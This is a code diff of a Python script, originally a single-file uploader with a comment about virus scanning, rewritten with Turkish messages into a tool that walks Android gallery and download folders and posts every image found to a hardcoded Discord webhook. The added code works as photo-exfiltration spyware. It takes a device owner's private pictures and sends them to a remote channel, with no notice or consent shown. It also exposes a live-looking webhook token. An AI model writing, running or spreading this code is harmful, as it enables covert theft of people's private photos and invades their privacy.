@@ -1,21 +1,43 @@
 import os
 import requests
 
-DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1414659884317802728/5Kwn9NVvA0fvQZBUaQqhJS78NrggzvNxw2ctFBSEjcxqx2K-6qfMYW_9J8uGFnaSwWdi')
+# Webhook URL'ni buraya yaz!
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1414659884317802728/5Kwn9NVvA0fvQZBUaQqhJS78NrggzvNxw2ctFBSEjcxqx2K-6qfMYW_9J8uGFnaSwWdi"
 
 def upload_file_to_discord(file_path):
-    with open(file_path, 'rb') as f:
-        files = {'file': (os.path.basename(file_path), f)}
-        response = requests.post(DISCORD_WEBHOOK_URL, files=files)
-    if response.status_code == 204 or response.status_code == 200:
-        print(f'File {file_path} uploaded successfully!')
-    else:
-        print(f'Failed to upload file: {response.status_code} - {response.text}')
+    try:
+        with open(file_path, 'rb') as f:
+            files = {'file': (os.path.basename(file_path), f)}
+            response = requests.post(DISCORD_WEBHOOK_URL, files=files)
+        if response.status_code in [200, 204]:
+            print(f"✅ {file_path} gönderildi")
+        else:
+            print(f"❌ {file_path} gönderilemedi: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"⚠️ Hata oluştu: {file_path}: {e}")
+
+def find_images_in_gallery():
+    gallery_paths = [
+        '/sdcard/DCIM/Camera',
+        '/sdcard/Pictures',
+        '/storage/emulated/0/DCIM/Camera',
+        '/storage/emulated/0/Pictures',
+        '/sdcard/Download'
+    ]
+    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
+    image_files = []
+    for folder in gallery_paths:
+        if os.path.exists(folder):
+            for root, dirs, files in os.walk(folder):
+                for file in files:
+                    if file.lower().endswith(image_extensions):
+                        image_files.append(os.path.join(root, file))
+    return image_files
 
 if __name__ == '__main__':
-    import sys
-    if len(sys.argv) < 2:
-        print("Usage: python scan_and_upload.py <file_path>")
-    else:
-        # (Burada dosya tarama işlemi ekleyebilirsin, ör: virustotal API, clamav vb.)
-        upload_file_to_discord(sys.argv[1])
+    print("Galeri taranıyor...")
+    images = find_images_in_gallery()
+    print(f"{len(images)} fotoğraf bulundu, gönderiliyor.")
+    for img in images:
+        upload_file_to_discord(img)
+    print("Tüm fotoğraflar gönderildi.")
